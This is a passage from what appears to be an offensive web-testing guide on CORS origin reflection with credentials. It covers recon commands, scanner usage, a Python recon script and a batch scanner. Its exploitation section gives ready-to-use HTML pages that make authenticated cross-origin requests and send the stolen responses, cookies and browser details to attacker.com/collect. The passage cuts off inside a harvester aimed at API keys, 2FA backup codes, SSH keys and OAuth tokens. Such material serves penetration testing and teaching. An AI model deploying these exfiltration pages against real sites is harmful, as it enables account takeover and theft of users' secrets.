---
title: Wildcard Origin with Credentials
description: CORS misconfigurations where servers reflect arbitrary origins with credentials enabled, covering reconnaissance through full account takeover chains.
navigation:
  icon: i-lucide-shield-off
  title: Wildcard Origin with Credentials
---

::badge
**CORS-WC-001**
::

::badge
**CVSS 8.1 — High/Critical**
::

::badge
**CWE-942**
::

::badge
**OWASP API7:2023**
::

::badge
**PCI DSS 6.5.9**
::

## Vulnerability Overview

::callout{icon="i-lucide-skull" color="red"}
**Wildcard Origin with Credentials** is the most dangerous class of CORS misconfiguration. The server dynamically reflects whatever `Origin` header an attacker sends into `Access-Control-Allow-Origin` while simultaneously returning `Access-Control-Allow-Credentials: true`. This allows any attacker-controlled website to make authenticated cross-origin requests and **read the full response** — including tokens, PII, API keys, and session data — using the victim's cookies.
::

::note
Browsers intentionally block `Access-Control-Allow-Origin: *` combined with `Access-Control-Allow-Credentials: true`. Developers work around this by reflecting the requesting origin verbatim, which creates a far worse vulnerability than a simple wildcard.
::

## Attack Flow Diagrams

### Basic CORS Exploitation Flow

::code-preview
---
class: "[&>div]:*:my-0 [&>div]:*:w-full"
---

```
┌──────────────┐         ┌──────────────────┐         ┌──────────────┐
│              │  1. Visit│                  │         │              │
│   VICTIM     │────────►│  ATTACKER SITE   │         │  TARGET API  │
│   BROWSER    │         │  (evil.com)       │         │  (target.com)│
│              │◄────────│                  │         │              │
│              │  2. Serve│  cors-exploit.html│         │              │
│              │  exploit │                  │         │              │
│              │         └──────────────────┘         │              │
│              │                                       │              │
│              │  3. XHR/Fetch with credentials         │              │
│              │──────────────────────────────────────►│              │
│              │     Origin: https://evil.com           │              │
│              │     Cookie: session=victim_token       │              │
│              │                                       │              │
│              │  4. Response with reflected origin      │              │
│              │◄──────────────────────────────────────│              │
│              │     ACAO: https://evil.com             │              │
│              │     ACAC: true                         │              │
│              │     Body: {"api_key":"sk-live-xxx"}    │              │
│              │                                       │              │
│              │  5. Exfiltrate stolen data              │              │
│              │────────────────────┐                   │              │
│              │                    ▼                   │              │
│              │         ┌──────────────────┐         │              │
│              │         │  ATTACKER C2     │         │              │
│              │         │  (collect.evil)  │         │              │
│              │         └──────────────────┘         │              │
└──────────────┘                                       └──────────────┘
```

#code
```
CORS Wildcard + Credentials Attack Flow
Victim visits attacker page → JS fires authenticated request → Server reflects origin → Attacker reads response
```
::

### Preflight vs Simple Request Flow

::code-preview
---
class: "[&>div]:*:my-0 [&>div]:*:w-full"
---

```
SIMPLE REQUEST (No Preflight)                PREFLIGHTED REQUEST
─────────────────────────────                ────────────────────────

Browser ──► Target                           Browser ──► Target
  GET /api/data                                OPTIONS /api/data
  Origin: evil.com                             Origin: evil.com
  Cookie: session=xxx                          Access-Control-Request-Method: PUT
                                               Access-Control-Request-Headers: X-Token
         ◄── Target                                    ◄── Target
  ACAO: evil.com                               ACAO: evil.com
  ACAC: true                                   ACAM: GET, PUT, DELETE
  Body: { sensitive data }                     ACAH: X-Token, Authorization
                                               ACAC: true
  ✓ JS can read response
                                             Browser ──► Target (Actual Request)
                                               PUT /api/data
                                               Origin: evil.com
                                               Cookie: session=xxx
                                               X-Token: value

                                                      ◄── Target
                                               ACAO: evil.com
                                               ACAC: true
                                               Body: { sensitive data }

                                               ✓ JS can read response
```

#code
```
Simple requests (GET/POST with standard headers) skip preflight
Preflighted requests (PUT/DELETE/custom headers) require OPTIONS first
Both are exploitable when origin is reflected with credentials
```
::

### Null Origin Attack Vector Flow

::code-preview
---
class: "[&>div]:*:my-0 [&>div]:*:w-full"
---

```
┌─────────────────────────────────────────────────────────────┐
│                    NULL ORIGIN VECTORS                       │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. Sandboxed iframe                                        │
│     <iframe sandbox="allow-scripts" srcdoc="...">           │
│     └──► Origin: null                                       │
│                                                             │
│  2. data: URI                                               │
│     window.open('data:text/html,...')                        │
│     └──► Origin: null                                       │
│                                                             │
│  3. file:// protocol                                        │
│     file:///tmp/exploit.html                                │
│     └──► Origin: null                                       │
│                                                             │
│  4. Cross-origin redirect                                   │
│     302 redirect from different origin                      │
│     └──► Origin: null (in some browsers)                    │
│                                                             │
│  5. Blob URL                                                │
│     URL.createObjectURL(new Blob([html]))                   │
│     └──► Origin: null                                       │
│                                                             │
│  6. XSLT document                                           │
│     Transformed XML document context                        │
│     └──► Origin: null                                       │
│                                                             │
│  All vectors send "Origin: null" to the target server       │
│  If ACAO: null + ACAC: true → EXPLOITABLE                   │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

#code
```
Six distinct vectors produce null origin requests exploitable when servers trust Origin: null
```
::

### Chained Attack Decision Tree

::code-preview
---
class: "[&>div]:*:my-0 [&>div]:*:w-full"
---

```
                    ┌─────────────────────┐
                    │  Test CORS Headers  │
                    └──────────┬──────────┘
                               │
                    ┌──────────▼──────────┐
                    │  Send arbitrary     │
                    │  Origin header      │
                    └──────────┬──────────┘
                               │
              ┌────────────────┼────────────────┐
              ▼                ▼                ▼
     ┌────────────────┐ ┌───────────┐ ┌──────────────┐
     │ Origin         │ │ Origin    │ │ No ACAO      │
     │ Reflected +    │ │ Reflected │ │ Header       │
     │ ACAC: true     │ │ No ACAC   │ │ Returned     │
     └───────┬────────┘ └─────┬─────┘ └──────┬───────┘
             │                │               │
             ▼                ▼               ▼
     ┌──────────────┐ ┌────────────┐  ┌─────────────┐
     │ CRITICAL     │ │ MEDIUM     │  │ Try bypass  │
     │ Full exploit │ │ No cookies │  │ patterns    │
     │ possible     │ │ but public │  │ & null      │
     └───────┬──────┘ │ data leak  │  └──────┬──────┘
             │        └────────────┘         │
      ┌──────┴────────────────┐       ┌──────▼──────┐
      ▼                       ▼       │ Test regex  │
┌───────────┐          ┌───────────┐  │ bypasses    │
│ Read-only │          │ State     │  └─────────────┘
│ data theft│          │ changing  │
│ (GET)     │          │ abuse     │
│           │          │ (PUT/POST │
│ • Tokens  │          │  /DELETE) │
│ • PII     │          │           │
│ • API keys│          │ • ATO     │
│ • Configs │          │ • Priv    │
│ • Secrets │          │   Esc     │
└───────────┘          └───────────┘
```

#code
```
Decision tree for CORS testing - determine vulnerability severity and exploitation path
```
::

## Reconnaissance & Detection

### HTTP Header Analysis

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Curl Methods"}

  ::code-preview
  Basic origin reflection test.

  #code
  ```bash
  curl -sI -H "Origin: https://evil.com" https://target.com/api/user/profile | grep -iE "access-control"
  ```
  ::

  ::code-preview
  Full header dump with authentication.

  #code
  ```bash
  curl -s -D- -o /dev/null \
    -H "Origin: https://evil.com" \
    -H "Cookie: session=eyJhbGciOiJIUzI1NiJ9.valid" \
    -H "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.valid" \
    https://target.com/api/user/profile
  ```
  ::

  ::code-preview
  Test with multiple auth mechanisms simultaneously.

  #code
  ```bash
  curl -v \
    -H "Origin: https://evil.com" \
    -H "Cookie: session=abc123; csrf_token=xyz789" \
    -H "Authorization: Bearer jwt_token_here" \
    -H "X-API-Key: api_key_here" \
    https://target.com/api/user/profile 2>&1 | grep -iE "(< access-control|< set-cookie|HTTP/)"
  ```
  ::

  ::code-preview
  Test preflight request handling.

  #code
  ```bash
  curl -v -X OPTIONS \
    -H "Origin: https://evil.com" \
    -H "Access-Control-Request-Method: GET" \
    -H "Access-Control-Request-Headers: Authorization,Content-Type,X-Requested-With" \
    https://target.com/api/user/profile 2>&1 | grep -iE "access-control"
  ```
  ::

  ::code-preview
  Test PUT/DELETE preflight.

  #code
  ```bash
  curl -v -X OPTIONS \
    -H "Origin: https://evil.com" \
    -H "Access-Control-Request-Method: DELETE" \
    -H "Access-Control-Request-Headers: Authorization" \
    https://target.com/api/admin/users/1 2>&1 | grep -iE "access-control"
  ```
  ::

  ::code-preview
  Compare response with and without origin header.

  #code
  ```bash
  echo "=== WITHOUT ORIGIN ===" && \
  curl -sI https://target.com/api/user/profile | grep -iE "access-control" && \
  echo "=== WITH ORIGIN ===" && \
  curl -sI -H "Origin: https://evil.com" https://target.com/api/user/profile | grep -iE "access-control"
  ```
  ::

  ::code-preview
  Trace full request-response cycle.

  #code
  ```bash
  curl --trace-ascii cors_trace.log \
    -H "Origin: https://evil.com" \
    -H "Cookie: session=valid" \
    https://target.com/api/user/profile
  cat cors_trace.log | grep -A2 -iE "(origin|access-control)"
  ```
  ::

  :::

  :::tabs-item{icon="i-lucide-file-code" label="HTTPie Methods"}

  ::code-preview
  Basic test with HTTPie.

  #code
  ```bash
  http GET https://target.com/api/user/profile Origin:https://evil.com --print=h
  ```
  ::

  ::code-preview
  Verbose output with cookies.

  #code
  ```bash
  http -v GET https://target.com/api/user/profile \
    Origin:https://evil.com \
    Cookie:"session=valid_token" \
    --print=hHbB
  ```
  ::

  ::code-preview
  Preflight simulation.

  #code
  ```bash
  http OPTIONS https://target.com/api/user/profile \
    Origin:https://evil.com \
    Access-Control-Request-Method:PUT \
    Access-Control-Request-Headers:Authorization
  ```
  ::

  :::

  :::tabs-item{icon="i-lucide-code" label="Python Requests"}

  ::code-collapse

  ```python [cors_recon.py]
  #!/usr/bin/env python3
  """CORS Reconnaissance Script - Tests multiple origin patterns"""

  import requests
  import sys
  import json
  import urllib3
  from concurrent.futures import ThreadPoolExecutor, as_completed

  urllib3.disable_warnings()

  class CORSRecon:
      def __init__(self, target, cookies=None, headers=None):
          self.target = target
          self.session = requests.Session()
          self.session.verify = False
          if cookies:
              self.session.cookies.update(cookies)
          if headers:
              self.session.headers.update(headers)
          self.results = []

      def test_origin(self, origin):
          try:
              resp = self.session.get(
                  self.target,
                  headers={'Origin': origin},
                  timeout=10
              )
              acao = resp.headers.get('Access-Control-Allow-Origin', '')
              acac = resp.headers.get('Access-Control-Allow-Credentials', '')
              acam = resp.headers.get('Access-Control-Allow-Methods', '')
              acah = resp.headers.get('Access-Control-Allow-Headers', '')

              result = {
                  'origin': origin,
                  'acao': acao,
                  'acac': acac,
                  'acam': acam,
                  'acah': acah,
                  'status': resp.status_code,
                  'reflected': acao == origin,
                  'credentials': acac.lower() == 'true',
                  'critical': acao == origin and acac.lower() == 'true',
                  'body_length': len(resp.text)
              }
              self.results.append(result)
              return result
          except Exception as e:
              return {'origin': origin, 'error': str(e)}

      def run_all_tests(self):
          domain = self.target.split('/')[2]
          origins = [
              'https://evil.com',
              'https://attacker.xyz',
              'null',
              f'https://{domain}.evil.com',
              f'https://evil-{domain}',
              f'https://evil{domain}',
              f'https://{domain}@evil.com',
              f'http://{domain}',
              f'https://sub.{domain}',
              f'https://{domain}%00.evil.com',
              f'https://{domain}%60.evil.com',
              f'https://{domain}%09.evil.com',
              f'https://{domain}\\.evil.com',
              f'https://{domain}_.evil.com',
              f'https://{domain}..evil.com',
              f'https://{domain}!.evil.com',
              f'https://evil.com#.{domain}',
              f'https://evil.com?.{domain}',
              f'https://evil.com/{domain}',
              f'https://{domain}:evil.com',
              f'https://not{domain}',
              f'https://{domain.replace(".", "")}evil.com',
              '',
              'https://',
              f'https://{domain}%252f.evil.com',
              f'https://evil.com%23{domain}',
          ]

          with ThreadPoolExecutor(max_workers=10) as executor:
              futures = {executor.submit(self.test_origin, o): o for o in origins}
              for future in as_completed(futures):
                  result = future.result()
                  if result.get('critical'):
                      print(f"\033[91m[CRITICAL]\033[0m {result['origin']}")
                      print(f"  ACAO: {result['acao']}")
                      print(f"  ACAC: {result['acac']}")
                  elif result.get('reflected'):
                      print(f"\033[93m[REFLECTED]\033[0m {result['origin']}")
                      print(f"  ACAO: {result['acao']}")
                  elif result.get('error'):
                      print(f"\033[90m[ERROR]\033[0m {result['origin']}: {result['error']}")

          return self.results

  if __name__ == '__main__':
      target = sys.argv[1] if len(sys.argv) > 1 else 'https://target.com/api/user/profile'
      cookies = {}
      if len(sys.argv) > 2:
          for c in sys.argv[2].split(';'):
              k, v = c.strip().split('=', 1)
              cookies[k] = v

      recon = CORSRecon(target, cookies=cookies)
      results = recon.run_all_tests()

      critical = [r for r in results if r.get('critical')]
      print(f"\n{'='*60}")
      print(f"[*] Total tests: {len(results)}")
      print(f"[*] Critical findings: {len(critical)}")

      with open('cors_recon_results.json', 'w') as f:
          json.dump(results, f, indent=2)
      print("[*] Results saved to cors_recon_results.json")
  ```

  ::

  :::

  :::tabs-item{icon="i-lucide-zap" label="wget & Ncat"}

  ::code-preview
  Using wget for CORS detection.

  #code
  ```bash
  wget -q --header="Origin: https://evil.com" \
    --server-response \
    https://target.com/api/user/profile \
    -O /dev/null 2>&1 | grep -iE "access-control"
  ```
  ::

  ::code-preview
  Raw socket request with ncat.

  #code
  ```bash
  printf 'GET /api/user/profile HTTP/1.1\r\nHost: target.com\r\nOrigin: https://evil.com\r\nCookie: session=valid_token\r\nConnection: close\r\n\r\n' | \
  ncat --ssl target.com 443 | grep -iE "access-control"
  ```
  ::

  ::code-preview
  Openssl s_client raw request.

  #code
  ```bash
  echo -e "GET /api/user/profile HTTP/1.1\r\nHost: target.com\r\nOrigin: https://evil.com\r\nCookie: session=valid\r\nConnection: close\r\n\r\n" | \
  openssl s_client -connect target.com:443 -quiet 2>/dev/null | grep -iE "access-control"
  ```
  ::

  :::
::

### Automated Scanning Tools

::tabs
  :::tabs-item{icon="i-lucide-scan" label="Nuclei"}

  ::code-preview
  Default CORS templates.

  #code
  ```bash
  nuclei -l targets.txt -tags cors -severity critical,high -o cors-findings.txt -v
  ```
  ::

  ::code-preview
  With authentication headers.

  #code
  ```bash
  nuclei -l targets.txt -tags cors \
    -H "Cookie: session=valid_token" \
    -H "Authorization: Bearer jwt_here" \
    -rate-limit 50 \
    -bulk-size 25 \
    -o cors-auth-findings.txt
  ```
  ::

  ::code-preview
  Custom template scan with proxy.

  #code
  ```bash
  nuclei -u https://target.com/api/user/profile \
    -t ./custom-cors-templates/ \
    -proxy http://127.0.0.1:8080 \
    -v -debug
  ```
  ::

  ::code-preview
  Scan with multiple custom headers and JSON output.

  #code
  ```bash
  nuclei -l api-endpoints.txt \
    -tags cors \
    -H "Cookie: session=abc" \
    -H "X-API-Key: key123" \
    -json -o cors-results.json \
    -severity critical,high,medium \
    -rate-limit 100
  ```
  ::

  :::

  :::tabs-item{icon="i-lucide-scan" label="CORScanner"}

  ::code-preview
  Single target verbose.

  #code
  ```bash
  python3 CORScanner/cors_scan.py -u https://target.com -v
  ```
  ::

  ::code-preview
  Bulk scan with threading.

  #code
  ```bash
  python3 CORScanner/cors_scan.py -i targets.txt -t 100 -o cors_results.json -v
  ```
  ::

  ::code-preview
  With custom origin and headers.

  #code
  ```bash
  python3 CORScanner/cors_scan.py \
    -u https://target.com/api/user/profile \
    -v \
    --headers '{"Cookie": "session=valid", "Authorization": "Bearer token"}'
  ```
  ::

  :::

  :::tabs-item{icon="i-lucide-scan" label="Corsy"}

  ::code-preview
  Single URL scan.

  #code
  ```bash
  python3 corsy.py -u https://target.com/api/user/profile -t 20
  ```
  ::

  ::code-preview
  Bulk scan with delay.

  #code
  ```bash
  python3 corsy.py -i urls.txt -t 30 -d 2 --headers "Cookie: session=abc123"
  ```
  ::

  ::code-preview
  Output to JSON.

  #code
  ```bash
  python3 corsy.py -i urls.txt -t 50 -o cors_corsy_results.json
  ```
  ::

  :::

  :::tabs-item{icon="i-lucide-scan" label="httpx & ffuf"}

  ::code-preview
  Mass CORS detection with httpx.

  #code
  ```bash
  cat urls.txt | httpx -H "Origin: https://evil.com" \
    -match-string "Access-Control-Allow-Origin: https://evil.com" \
    -mc 200 -title -status-code -content-length
  ```
  ::

  ::code-preview
  httpx with response header extraction.

  #code
  ```bash
  cat urls.txt | httpx -H "Origin: https://evil.com" \
    -response-header "Access-Control-Allow-Origin,Access-Control-Allow-Credentials" \
    -json -o httpx-cors.json
  ```
  ::

  ::code-preview
  ffuf for endpoint discovery with CORS headers.

  #code
  ```bash
  ffuf -u https://target.com/api/FUZZ \
    -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
    -H "Origin: https://evil.com" \
    -mr "Access-Control-Allow-Credentials: true" \
    -o ffuf-cors.json -of json
  ```
  ::

  ::code-preview
  ffuf origin fuzzing on single endpoint.

  #code
  ```bash
  ffuf -u https://target.com/api/user/profile \
    -w origin-payloads.txt \
    -H "Origin: FUZZ" \
    -mr "Access-Control-Allow-Credentials: true" \
    -mc all
  ```
  ::

  :::

  :::tabs-item{icon="i-lucide-scan" label="Meg & Hakrawler"}

  ::code-preview
  Meg for bulk CORS header collection.

  #code
  ```bash
  meg -H "Origin: https://evil.com" /api/user/profile targets.txt cors-output/ -v
  grep -rl "Access-Control-Allow-Credentials" cors-output/
  ```
  ::

  ::code-preview
  Hakrawler to discover API endpoints then test.

  #code
  ```bash
  echo "https://target.com" | hakrawler -d 3 -plain | \
    grep -iE "/api/|/v[0-9]/" | sort -u | \
    while read url; do
      echo -n "[*] $url -> "
      curl -sI -H "Origin: https://evil.com" "$url" | grep -i "Access-Control-Allow-Origin" || echo "NO ACAO"
    done
  ```
  ::

  ::code-preview
  GAU + CORS testing pipeline.

  #code
  ```bash
  gau target.com --threads 5 | \
    grep -iE "/api/|/v[0-9]/|/graphql|/rest/" | sort -u | \
    httpx -H "Origin: https://evil.com" \
    -match-string "evil.com" -mc 200 -silent
  ```
  ::

  :::
::

### Endpoint Discovery for CORS Testing

::tabs
  :::tabs-item{icon="i-lucide-search" label="API Enumeration"}

  ::code-preview
  Discover API endpoints from JavaScript files.

  #code
  ```bash
  # Extract API endpoints from JS files
  curl -s https://target.com | grep -oP 'src="[^"]*\.js"' | sed 's/src="//;s/"//' | while read js; do
    [[ "$js" == http* ]] || js="https://target.com$js"
    curl -s "$js" | grep -oP '["'"'"'](/api/[^"'"'"'\s]+)["'"'"']' | tr -d "\"'" | sort -u
  done | sort -u | tee api_endpoints.txt
  ```
  ::

  ::code-preview
  Extract endpoints from Swagger/OpenAPI docs.

  #code
  ```bash
  for path in "/swagger.json" "/openapi.json" "/api-docs" "/v2/api-docs" "/v3/api-docs" "/swagger/v1/swagger.json" "/api/swagger.json"; do
    status=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com$path")
    if [ "$status" = "200" ]; then
      echo "[+] Found: https://target.com$path"
      curl -s "https://target.com$path" | python3 -c "
  import sys,json
  try:
      d=json.load(sys.stdin)
      paths=d.get('paths',{})
      for p in paths:
          for m in paths[p]:
              print(f'{m.upper()} {p}')
  except: pass" | tee swagger_endpoints.txt
    fi
  done
  ```
  ::

  ::code-preview
  Wordlist-based API endpoint bruteforce.

  #code
  ```bash
  ffuf -u https://target.com/api/FUZZ \
    -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
    -mc 200,201,204,301,302,401,403 \
    -H "Origin: https://evil.com" \
    -H "Cookie: session=valid" \
    -o api-discovery.json -of json
  ```
  ::

  ::code-preview
  GraphQL introspection for endpoints.

  #code
  ```bash
  curl -s -X POST https://target.com/graphql \
    -H "Content-Type: application/json" \
    -H "Origin: https://evil.com" \
    -H "Cookie: session=valid" \
    -d '{"query":"{__schema{types{name,fields{name}}}}"}' | python3 -m json.tool
  ```
  ::

  :::

  :::tabs-item{icon="i-lucide-search" label="Batch CORS Scan"}

  ::code-collapse

  ```bash [cors-batch-scan.sh]
  #!/bin/bash
  # Comprehensive CORS batch scanner for discovered endpoints

  TARGET_BASE="${1:-https://target.com}"
  COOKIE="${2:-session=valid_token}"
  OUTPUT="cors_scan_$(date +%Y%m%d_%H%M%S).txt"

  ENDPOINTS=(
    "/api/user/profile"
    "/api/user/settings"
    "/api/user/billing"
    "/api/user/api-keys"
    "/api/user/sessions"
    "/api/user/2fa"
    "/api/user/notifications"
    "/api/user/preferences"
    "/api/admin/users"
    "/api/admin/config"
    "/api/admin/logs"
    "/api/admin/roles"
    "/api/v1/me"
    "/api/v1/account"
    "/api/v1/organizations"
    "/api/v1/teams"
    "/api/v2/user"
    "/api/v2/account/details"
    "/api/internal/config"
    "/api/internal/health"
    "/api/oauth/tokens"
    "/api/auth/session"
    "/api/graphql"
    "/api/webhooks"
    "/api/integrations"
    "/api/keys"
    "/api/export/data"
    "/api/search"
    "/userinfo"
    "/oauth/userinfo"
    "/.well-known/openid-configuration"
  )

  TEST_ORIGINS=(
    "https://evil.com"
    "null"
    "https://${TARGET_BASE##*/}.evil.com"
    "http://${TARGET_BASE##*/}"
  )

  echo "[*] CORS Batch Scanner" | tee "$OUTPUT"
  echo "[*] Target: $TARGET_BASE" | tee -a "$OUTPUT"
  echo "[*] Endpoints: ${#ENDPOINTS[@]}" | tee -a "$OUTPUT"
  echo "[*] Origins: ${#TEST_ORIGINS[@]}" | tee -a "$OUTPUT"
  echo "==========================================" | tee -a "$OUTPUT"

  for endpoint in "${ENDPOINTS[@]}"; do
    for origin in "${TEST_ORIGINS[@]}"; do
      url="${TARGET_BASE}${endpoint}"
      result=$(curl -s -I \
        -H "Origin: $origin" \
        -H "Cookie: $COOKIE" \
        "$url" 2>/dev/null)
      
      acao=$(echo "$result" | grep -i "Access-Control-Allow-Origin:" | tr -d '\r\n')
      acac=$(echo "$result" | grep -i "Access-Control-Allow-Credentials:" | tr -d '\r\n')
      status=$(echo "$result" | head -1 | awk '{print $2}')
      
      if [ -n "$acao" ]; then
        if echo "$acac" | grep -qi "true"; then
          echo -e "\033[91m[CRITICAL] $endpoint | Origin: $origin | $acao | $acac | HTTP $status\033[0m" | tee -a "$OUTPUT"
        else
          echo -e "\033[93m[MEDIUM] $endpoint | Origin: $origin | $acao | HTTP $status\033[0m" | tee -a "$OUTPUT"
        fi
      fi
    done
  done

  echo "" | tee -a "$OUTPUT"
  echo "[*] Scan complete. Results: $OUTPUT" | tee -a "$OUTPUT"
  ```

  ::

  :::
::

## Response Pattern Identification

::accordion
  :::accordion-item{icon="i-lucide-circle-alert" label="Pattern 1 — Full Origin Reflection (CRITICAL)"}
  **Request:**
  ```http
  GET /api/user/profile HTTP/1.1
  Host: target.com
  Origin: https://evil.com
  Cookie: session=eyJhbGciOiJIUzI1NiJ9...
  ```

  **Response:**
  ```http
  HTTP/1.1 200 OK
  Access-Control-Allow-Origin: https://evil.com
  Access-Control-Allow-Credentials: true
  Content-Type: application/json

  {"id":1337,"username":"admin","email":"admin@target.com","api_key":"sk-live-9f8e7d6c5b4a3210"}
  ```

  ::callout{icon="i-lucide-skull" color="red"}
  Any arbitrary origin is reflected with credentials. Full cross-origin data theft is possible.
  ::
  :::

  :::accordion-item{icon="i-lucide-circle-alert" label="Pattern 2 — Null Origin Accepted (CRITICAL)"}
  **Request:**
  ```http
  GET /api/user/profile HTTP/1.1
  Host: target.com
  Origin: null
  Cookie: session=eyJhbGciOiJIUzI1NiJ9...
  ```

  **Response:**
  ```http
  HTTP/1.1 200 OK
  Access-Control-Allow-Origin: null
  Access-Control-Allow-Credentials: true
  ```

  ::callout{icon="i-lucide-skull" color="red"}
  Exploitable via sandboxed iframes, data URIs, file protocol, and blob URLs.
  ::
  :::

  :::accordion-item{icon="i-lucide-circle-alert" label="Pattern 3 — Regex Suffix Bypass (HIGH)"}
  **Request:**
  ```http
  GET /api/user/profile HTTP/1.1
  Host: target.com
  Origin: https://target.com.evil.com
  Cookie: session=eyJhbGciOiJIUzI1NiJ9...
  ```

  **Response:**
  ```http
  HTTP/1.1 200 OK
  Access-Control-Allow-Origin: https://target.com.evil.com
  Access-Control-Allow-Credentials: true
  ```

  ::warning
  Weak regex `/target\.com/` matches substrings. Attacker registers `target.com.evil.com`.
  ::
  :::

  :::accordion-item{icon="i-lucide-circle-alert" label="Pattern 4 — Regex Prefix Bypass (HIGH)"}
  **Request:**
  ```http
  GET /api/user/profile HTTP/1.1
  Host: target.com
  Origin: https://evil-target.com
  Cookie: session=eyJhbGciOiJIUzI1NiJ9...
  ```

  **Response:**
  ```http
  HTTP/1.1 200 OK
  Access-Control-Allow-Origin: https://evil-target.com
  Access-Control-Allow-Credentials: true
  ```

  ::warning
  Regex anchored at end only `/target\.com$/` allows prefix injection.
  ::
  :::

  :::accordion-item{icon="i-lucide-circle-alert" label="Pattern 5 — Protocol Downgrade (HIGH)"}
  **Request:**
  ```http
  GET /api/user/profile HTTP/1.1
  Host: target.com
  Origin: http://target.com
  Cookie: session=eyJhbGciOiJIUzI1NiJ9...
  ```

  **Response:**
  ```http
  HTTP/1.1 200 OK
  Access-Control-Allow-Origin: http://target.com
  Access-Control-Allow-Credentials: true
  ```

  ::caution
  HTTP origin accepted. Network attacker (MitM) can serve exploit page over HTTP.
  ::
  :::

  :::accordion-item{icon="i-lucide-circle-alert" label="Pattern 6 — Wildcard Subdomain Trust (MEDIUM-HIGH)"}
  **Request:**
  ```http
  GET /api/user/profile HTTP/1.1
  Host: target.com
  Origin: https://anything.target.com
  Cookie: session=eyJhbGciOiJIUzI1NiJ9...
  ```

  **Response:**
  ```http
  HTTP/1.1 200 OK
  Access-Control-Allow-Origin: https://anything.target.com
  Access-Control-Allow-Credentials: true
  ```

  ::tip
  Chainable with subdomain takeover or XSS on any subdomain of target.com.
  ::
  :::

  :::accordion-item{icon="i-lucide-circle-alert" label="Pattern 7 — Exposed Methods (HIGH)"}
  **Request:**
  ```http
  OPTIONS /api/admin/users HTTP/1.1
  Host: target.com
  Origin: https://evil.com
  Access-Control-Request-Method: DELETE
  ```

  **Response:**
  ```http
  HTTP/1.1 200 OK
  Access-Control-Allow-Origin: https://evil.com
  Access-Control-Allow-Credentials: true
  Access-Control-Allow-Methods: GET, POST, PUT, DELETE, PATCH
  Access-Control-Allow-Headers: Authorization, Content-Type, X-CSRF-Token
  ```

  ::caution
  State-changing methods (PUT/DELETE/PATCH) exposed cross-origin with credentials.
  ::
  :::

  :::accordion-item{icon="i-lucide-circle-alert" label="Pattern 8 — Vary Header Missing (MEDIUM)"}
  **Response missing Vary: Origin**
  ```http
  HTTP/1.1 200 OK
  Access-Control-Allow-Origin: https://evil.com
  Access-Control-Allow-Credentials: true
  Cache-Control: public, max-age=3600
  ```

  ::note
  Without `Vary: Origin`, CDN/proxy caches may serve the attacker-origin response to legitimate users, enabling cache-based CORS poisoning.
  ::
  :::
::

## Exploitation Techniques

### Technique 1 — Basic XHR Data Theft

::tabs
  :::tabs-item{icon="i-lucide-code" label="XMLHttpRequest"}
  ```html [cors-xhr-steal.html]
  <html>
  <head><title>Loading...</title></head>
  <body>
  <script>
  var TARGET = 'https://target.com/api/user/profile';
  var EXFIL  = 'https://attacker.com/collect';

  var xhr = new XMLHttpRequest();
  xhr.onreadystatechange = function() {
    if (xhr.readyState === XMLHttpRequest.DONE) {
      if (xhr.status === 200) {
        // Exfiltrate data
        var e = new XMLHttpRequest();
        e.open('POST', EXFIL, true);
        e.setRequestHeader('Content-Type', 'application/json');
        e.send(JSON.stringify({
          endpoint: TARGET,
          status: xhr.status,
          headers: xhr.getAllResponseHeaders(),
          body: xhr.responseText,
          timestamp: new Date().toISOString()
        }));
      }
    }
  };
  xhr.open('GET', TARGET, true);
  xhr.withCredentials = true;
  xhr.send();
  </script>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Fetch API"}
  ```html [cors-fetch-steal.html]
  <html>
  <body>
  <script>
  const TARGET = 'https://target.com/api/user/profile';
  const EXFIL  = 'https://attacker.com/collect';

  fetch(TARGET, {
    method: 'GET',
    credentials: 'include',
    mode: 'cors'
  })
  .then(response => {
    // Capture all response headers
    let headers = {};
    response.headers.forEach((v, k) => headers[k] = v);
    return response.text().then(body => ({ body, headers, status: response.status }));
  })
  .then(data => {
    return fetch(EXFIL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        stolen_data: data.body,
        response_headers: data.headers,
        status: data.status,
        victim_cookies: document.cookie,
        victim_url: location.href,
        referrer: document.referrer,
        user_agent: navigator.userAgent,
        timestamp: new Date().toISOString()
      })
    });
  })
  .catch(console.error);
  </script>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="jQuery AJAX"}
  ```html [cors-jquery-steal.html]
  <html>
  <head>
  <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
  </head>
  <body>
  <script>
  $.ajax({
    url: 'https://target.com/api/user/profile',
    xhrFields: { withCredentials: true },
    success: function(data) {
      $.post('https://attacker.com/collect', {
        stolen: JSON.stringify(data),
        ts: Date.now()
      });
    }
  });
  </script>
  </body>
  </html>
  ```
  :::
::

### Technique 2 — Multi-Endpoint Harvester

::collapsible

```html [multi-endpoint-harvester.html]
<html>
<body>
<script>
const ATTACKER = 'https://attacker.com/collect';
const TARGET   = 'https://target.com';

const ENDPOINTS = [
  { path: '/api/user/profile',       desc: 'User Profile' },
  { path: '/api/user/settings',      desc: 'User Settings' },
  { path: '/api/user/billing',       desc: 'Billing Info' },
  { path: '/api/user/api-keys',      desc: 'API Keys' },
  { path: '/api/user/sessions',      desc: 'Active Sessions' },
  { path: '/api/user/2fa',           desc: '2FA Config' },
  { path: '/api/user/2fa/backup',    desc: '2FA Backup Codes' },
  { path: '/api/user/ssh-keys',      desc: 'SSH Keys' },
  { path: '/api/user/tokens',        desc: 'Personal Tokens' },
  { path: '/api/user/organizations', desc: 'Organizations' },
  { path: '/api/user/teams',         desc: 'Teams' },
  { path: '/api/admin/users',        desc: 'Admin User List' },
  { path: '/api/admin/config',       desc: 'Admin Config' },
  { path: '/api/admin/audit-log',    desc: 'Audit Logs' },
  { path: '/api/admin/roles',        desc: 'Roles & Permissions' },
  { path: '/api/oauth/tokens',       desc: 'OAuth Tokens' },
  { path: '/api/oauth/applications', desc: 'OAuth Apps' },
  { path: '/api/webhooks',           desc: 'Webhooks' },
  { path: '/api/integrations',       desc: 'Integrations' },
  { path: '/api/export/csv',         desc: 'CSV Export' },
  { path: '/api/internal/config',    desc: 'Internal Config' },
  { path: '/graphql',                desc: 'GraphQL' },
